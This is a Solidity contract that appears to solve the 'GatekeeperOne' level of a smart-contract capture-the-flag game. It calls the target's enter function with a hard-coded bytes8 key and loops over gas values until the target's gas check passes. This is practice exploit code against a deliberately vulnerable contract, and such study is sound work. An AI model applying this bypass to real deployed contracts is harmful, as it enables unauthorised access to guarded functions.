// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel13.sol";

contract AttackGatekeeperOne {
    GatekeeperOne gatekeeperone;

    constructor(address _gatekeeperone) {
        gatekeeperone = GatekeeperOne(_gatekeeperone);
    }

    function attack() public {
        bytes8 _gateKey = 0x46f938660000f33a;
        for (uint256 i = 0; i < 300; i++) {
            (bool success,) =
                address(gatekeeperone).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}
